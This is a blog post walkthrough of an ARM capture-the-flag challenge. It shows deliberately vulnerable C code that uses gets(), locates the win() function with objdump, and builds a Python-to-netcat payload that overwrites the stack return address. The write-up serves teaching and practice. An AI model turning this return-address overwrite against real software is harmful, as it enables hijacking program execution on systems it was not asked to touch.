<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Buffer Overflow on ARM #2 :: Forest Hex — Explore Hacking</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Hello again faithful readers! Today we are going to explore another buffer overflow on an ARM binary. The previous challenge involved overwriting a variable. This one is going to overflow the return address instead.
What&amp;rsquo;s the return address? The return address is a value stored on the stack whenever a function is called. After the function finishes, the CPU will load the value of the return address and attempt to execute the data there."/>
<meta name="keywords" content="[hacking ctf binary overflow pentest shell]"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/buffer-overflow-on-arm-controlling-the-return-address/" />


<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/green.css">



<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">

<link rel="shortcut icon" href="/img/favicon/green.png">



<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Buffer Overflow on ARM #2 :: Forest Hex — Explore Hacking" />
<meta name="twitter:description" content="Hello again faithful readers! Today we are going to explore another buffer overflow on an ARM binary. The previous challenge involved overwriting a variable. This one is going to overflow the return address instead.
What&amp;rsquo;s the return address? The return address is a value stored on the stack whenever a function is called. After the function finishes, the CPU will load the value of the return address and attempt to execute the data there." />
<meta name="twitter:site" content="/" />
<meta name="twitter:creator" content="jive(x, 5000);" />
<meta name="twitter:image" content="">


<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Buffer Overflow on ARM #2 :: Forest Hex — Explore Hacking">
<meta property="og:description" content="Hello again faithful readers! Today we are going to explore another buffer overflow on an ARM binary. The previous challenge involved overwriting a variable. This one is going to overflow the return address instead.
What&amp;rsquo;s the return address? The return address is a value stored on the stack whenever a function is called. After the function finishes, the CPU will load the value of the return address and attempt to execute the data there." />
<meta property="og:url" content="/posts/buffer-overflow-on-arm-controlling-the-return-address/" />
<meta property="og:site_name" content="Buffer Overflow on ARM #2" />
<meta property="og:image" content="">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:section" content="Binary Exploitation" />
<meta property="article:published_time" content="2019-09-04 02:30:14 &#43;0000 UTC" />











</head>
<body class="">


<div class="container">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Forest Hex
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/buffer-overflow-on-arm-controlling-the-return-address/">Buffer Overflow on ARM #2</a></h1>
  <div class="post-meta">
    
    <span class="post-date">
      2019-09-04
    </span>
    
    
    <span class="post-author">::
      jive(x, 5000);
    </span>
    
  </div>

  
  <span class="post-tags">
    tags:
    
    #<a href="/tags/binary-explotation/">binary explotation</a>&nbsp;
    
    #<a href="/tags/ctf/">ctf</a>&nbsp;
    
    #<a href="/tags/arm/">arm</a>&nbsp;
    
    #<a href="/tags/overflow/">overflow</a>&nbsp;
    
  </span>
  

  

  <div class="post-content">
    

<p>Hello again faithful readers! Today we are going to explore another buffer overflow on an ARM binary. The previous challenge involved overwriting a variable. This one is going to overflow the return address instead.</p>

<h2 id="what-s-the-return-address">What&rsquo;s the return address?</h2>

<p>The return address is a value stored on the stack whenever a function is called. After the function finishes, the CPU will load the value of the return address and attempt to execute the data there. This means if we can overflow the return address we can get the CPU to jump to any memory address.</p>

<hr />

<h1 id="exploring-the-challenge">Exploring the Challenge</h1>

<p>Here&rsquo;s the source code for this challenge:</p>

<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &quot;flag.h&quot;

void win()
{
        printf(&quot;Wait, what? How?\n%s\n&quot;, FLAG);
}

void test()
{
        char buffer[0x80];
        printf(&quot;This time, there really is no way to get to the flag.\nDo you finally give up?\n&quot;);
        gets(buffer);
        if(strcmp(buffer,&quot;Yes&quot;)){
                printf(&quot;That wasn't a \&quot;Yes\&quot;\nYou better give up now\n&quot;);
        }
        else
        {
                printf(&quot;Damn right\n&quot;);
        }
}

int main(int argc, char **argv)
{
        test();
}
</code></pre>

<p>The important bits:</p>

<ol>
<li>The function which prints the flag, <code>win()</code> is never called in this code.</li>
<li>The input is evaluated by calling the function <code>test()</code>.</li>
<li><code>gets()</code> is used again to store the input in memory.</li>
<li>The buffer for the input is <code>128 bytes</code> in size.</li>
</ol>

<p>This all means we can overflow the memory, into the return address, and point the execution to whatever address we like.</p>

<h2 id="finding-the-right-address">Finding the Right Address</h2>

<p>To find the right address we are going to take a look at the assembly of the binary. There&rsquo;s a lovely tool in Linux called <code>objdump</code> that will output the assembly if given the <code>-d</code> tag.</p>

<p>Now, when I tried a standard <code>objdump -d</code> the program complained about the architecture being unknown. After a quick search I tried <code>objdump -d -m arm</code>, but it complained about not being able to do that.</p>

<p>Another, somewhat longer search, eventually led to the solution:</p>

<p><code>apt install gcc-arm-none-eabi</code></p>

<p><code>arm-none-eabi-objdump -d a.outl</code></p>

<p>That apt package installed an arm specifc objdump, and from that I was able to get the assembly. It outputs quite a lot that&rsquo;s not relevant to our current interests, so I ran it again and piped it into a grep statement:</p>

<p><code>arm-none-eabi-objdump -d a.out | grep win</code></p>


  <figure class="left" >
    <img src="/content/images/2019/09/image-5.png"   />
    
      <figcaption class="center" >Memory address of win()</figcaption>
    
  </figure>



<p>There&rsquo;s our address: <code>000104b0</code></p>

<p>If we overwrite the return address with that value, it should continue through the <code>win()</code> function which will print our flag.</p>

<h1 id="crafting-the-payload">Crafting the Payload</h1>

<p>We have 128 bytes to enter before we being to overflow. After that we begin to overflow into memory used for other purposes. Last time it was used for another variable, but this time there is no such variable declared so we end up overflowing into the metadata of the stack.</p>

<p>When a function is called in ARM assembly, the function creates a &ldquo;stack frame&rdquo;. There&rsquo;s a lot of that can be said about this concept, but we can get some help using this image from Azeria Labs:</p>


  <figure class="left" >
    <img src="/content/images/2019/09/image-6.png"   />
    
  </figure>



<p>From the image we can see the local variables are stored immediately before the frame pointer (FP), and link register (LR). These are both 4 byte memory addresses stored on the stack. The link register is also known as the return address, so that&rsquo;s the value we want to overwrite with <code>000104b0</code> to jump to the <code>win()</code> function.</p>

<p>To do so we fill up our local variable with 128 bytes + 4 bytes to overwrite the frame pointer (this can be whatever we want), and finally 4 more to overwrite the link register, AKA return address.</p>

<h2 id="there-s-one-catch-though">There&rsquo;s one catch though&hellip;</h2>

<p>We have to write the memory address backwards, one byte at a time. This is because the binary we are exploiting was compiled for ARM in Little Endian mode. There&rsquo;s a lot that can be said about that, but suffice to say for this post we need to simply be aware of this fact and adjust our payload properly.</p>

<p>So <code>00 01 04 b0</code> becomes <code>b0 04 01 00</code>. Our final payload becomes</p>

<p><code>128 bytes of anything for buffer</code> + <code>4 bytes of anything to overwrite frame pointer</code> + <code>address we want to jump to</code></p>

<p>We can use python to pipe the payload into netcat like so:</p>

<p><code>python -c 'print(&quot;\x41&quot;*132 + &quot;\xb0\x04\x01\x00&quot;)' | nc localhost 9003</code></p>


  <figure class="left" >
    <img src="/content/images/2019/09/image-10.png"   />
    
      <figcaption class="center" >Overflow working.</figcaption>
    
  </figure>



<h1 id="bingo-there-s-our-flag">Bingo, there&rsquo;s our flag.</h1>

<p>You might have noticed it shows the failure message first. That&rsquo;s because the overflow doesn&rsquo;t affect anything until the function completes, and the return popped off the stack so execution can jump to it.</p>

  </div>
  <br>

  
  <span class="post-tags">
    tags:
    
    #<a href="/tags/binary-explotation/">binary explotation</a>&nbsp;
    
    #<a href="/tags/ctf/">ctf</a>&nbsp;
    
    #<a href="/tags/arm/">arm</a>&nbsp;
    
    #<a href="/tags/overflow/">overflow</a>&nbsp;
    
  </span>
  


  
  <div class="pagination">
    <div class="pagination__title">
      <span class="pagination__title-h">Read other posts</span>
      <hr />
    </div>
    <div class="pagination__buttons">
      
      
      <span class="button next">
        <a href="/posts/buffer-overflow-on-arm-part-2/">
          <span class="button__text">ARM CTF - Sending Bytes</span>
          <span class="button__icon">→</span>
        </a>
      </span>
      
    </div>
  </div>
  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
    <div class="copyright copyright--user">
      <span>Forest Hex 2019</span>
      

      </div>
    </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>




  
</div>

</body>
</html>
